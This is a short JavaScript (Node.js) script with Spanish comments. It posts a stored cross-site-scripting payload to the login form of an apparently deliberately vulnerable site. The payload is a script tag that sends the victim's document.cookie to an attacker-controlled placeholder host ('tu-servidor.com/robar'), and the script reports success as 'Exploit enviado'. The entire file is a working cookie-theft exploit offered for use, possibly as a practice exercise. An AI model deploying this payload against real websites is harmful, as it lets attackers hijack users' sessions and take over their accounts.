const axios = require('axios');

const url = 'https://sitio-vulnerable-sw.onrender.com/login'; // URL del formulario vulnerable

// Payload como string válido en JS
const payload = `<script>fetch('http://tu-servidor.com/robar?cookie=' + document.cookie)</script>`;

// Supongamos que el backend espera un comentario, o el campo vulnerable
axios.post(url, { comentario: payload })
  .then(response => console.log('Exploit enviado con éxito'))
  .catch(error => console.error('Error al enviar exploit', error));
